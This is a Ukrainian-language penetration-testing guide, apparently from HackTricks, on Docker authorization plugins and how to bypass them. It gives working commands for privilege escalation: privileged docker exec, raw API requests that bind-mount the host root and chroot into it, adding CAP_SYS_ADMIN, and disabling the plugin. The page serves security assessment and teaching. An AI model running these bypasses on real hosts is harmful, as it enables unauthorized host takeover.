# Плагіни авторизації під час виконання

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Плагіни авторизації під час виконання — це додатковий шар політик, який вирішує, чи може викликач виконати певну дію демона. Docker — класичний приклад. За замовчуванням будь-хто, хто може звертатися до Docker демона, фактично має широкий контроль над ним. Плагіни авторизації намагаються звузити цю модель, аналізуючи автентифіковану особу та запитувану операцію API, після чого дозволяють або забороняють запит відповідно до політики.

Ця тема заслуговує окремої сторінки, тому що вона змінює модель експлуатації, коли атака вже має доступ до Docker API або до користувача в групі `docker`. У таких середовищах питання вже не лише «чи можу я дістатися до демона?», а й «чи оточений демон шаром авторизації, і якщо так — чи можна обійти цей шар через невраховані кінцеві точки, слабкий JSON-парсинг або дозволи на керування плагінами?»

## Робота

Коли запит досягає Docker демона, підсистема авторизації може передати контекст запиту одному або декільком встановленим плагінам. Плагін бачить автентифіковану ідентичність користувача, деталі запиту, вибрані заголовки та частини тіла запиту або відповіді, коли тип вмісту підходящий. Може бути побудовано ланцюжок з кількох плагінів, і доступ надається лише якщо всі плагіни дозволяють запит.

Ця модель звучить надійно, але її безпека повністю залежить від того, наскільки повно автор політики зрозумів API. Плагін, який блокує `docker run --privileged`, але ігнорує `docker exec`, пропускає альтернативні ключі JSON, такі як верхнього рівня `Binds`, або дозволяє адміністрування плагінів, може створити хибне відчуття обмеження, залишаючи відкритими прямі шляхи підвищення привілеїв.

## Типові цілі плагінів

Важливі області для перегляду політик:

- кінцеві точки створення контейнерів
- поля `HostConfig`, такі як `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` та опції спільних неймспейсів
- поведінка `docker exec`
- кінцеві точки керування плагінами
- будь-яка кінцева точка, яка може опосередковано викликати дії в час виконання поза наміченою моделлю політики

Історично приклади на кшталт Twistlock `authz` plugin та прості освітні плагіни як `authobot` полегшували вивчення цієї моделі, бо їхні файли політик та шляхи в коді показували, як насправді реалізовано відображення endpoint->action. Для оцінки безпеки важливий урок полягає в тому, що автор політики має розуміти повну поверхню API, а не лише найбільш видимі CLI-команди.

## Зловживання

Перша мета — з’ясувати, що саме блокується. Якщо демон відхиляє дію, the error often leaks the plugin name, що допомагає ідентифікувати контроль, який використовується:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Якщо вам потрібне ширше endpoint profiling, інструменти на кшталт `docker_auth_profiler` корисні, оскільки вони автоматизують інакше повторювану задачу перевірки, які API routes та JSON structures насправді дозволені плагіном.

Якщо в середовищі використовується кастомний plugin і ви можете взаємодіяти з API, перелічте, які поля об'єктів справді фільтруються:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ці перевірки важливі, оскільки багато помилок авторизації залежать від конкретного поля, а не від самої концепції. plugin може відхилити CLI pattern, не блокуючи повністю еквівалентну структуру API.

### Повний приклад: `docker exec` додає привілеї після створення контейнера

Політика, яка блокує створення привілейованих контейнерів, але дозволяє створення неконфайнованих контейнерів і використання `docker exec`, все ще може бути обійдена:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Якщо daemon прийме другий крок, користувач відновить привілейований інтерактивний процес всередині container, який автор політики вважав обмеженим.

### Повний приклад: Bind Mount Through Raw API

Деякі некоректні політики перевіряють лише одну JSON-форму. Якщо root filesystem bind mount не блокується послідовно, host все ще можна змонтувати:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Та сама ідея також може з'явитися під `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Наслідок — повний вихід на файлову систему хоста. Цікавий момент у тому, що обхід виникає через неповне покриття політики, а не через баг ядра.

### Повний приклад: неперевірений атрибут Capability

Якщо політика забуде відфільтрувати атрибут, пов'язаний з capability, атакувач може створити контейнер, який повторно отримує небезпечну capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Якщо присутній `CAP_SYS_ADMIN` або інша однаково потужна capability, багато технік втечі, описаних у [capabilities.md](protections/capabilities.md) та [privileged-containers.md](privileged-containers.md), стають доступними.

### Повний приклад: відключення плагіна

Якщо дозволені операції керування плагінами, найчистіший обхід може полягати в повному вимкненні контролю:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Це збій політики на рівні control-plane. Рівень авторизації існує, але користувач, якого він мав обмежити, все ще має дозвіл вимкнути його.

## Перевірки

Ці команди призначені для визначення, чи існує рівень політики та чи є він повноцінним або поверхневим.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Що тут цікаво:

- Повідомлення про відмову, які містять назву плагіна, підтверджують наявність шару авторизації і часто розкривають точну реалізацію.
- Список плагінів, видимий для атакувальника, може бути достатнім, щоб визначити, чи можливі операції відключення або переналаштування.
- Політику, яка блокує лише очевидні дії через CLI, але не блокує raw API-запити, слід вважати обхідною, доки не доведено протилежне.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Доступ до демона фактично є все-або-нічого, якщо не налаштовано authorization plugin | неповна політика плагінів, чорні списки замість білих списків, дозволення керування плагінами, сліпі зони на рівні полів |
| Podman | Not a common direct equivalent | Podman зазвичай більше покладається на Unix-права, rootless виконання та рішення щодо експонування API, ніж на Docker-style authz plugins | широке експонування Podman API з root-доступом, слабкі дозволи на сокет |
| containerd / CRI-O | Different control model | Ці рантайми зазвичай покладаються на права сокета, межі довіри вузла та контролі оркестратора вищого рівня, а не на Docker authz plugins | монтування сокета в робочі навантаження, слабкі припущення щодо локальної довіри вузла |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC і admission controls є основним шаром політики | надмірно широкі права RBAC, слабка admission-політика, пряме експонування kubelet або runtime API |
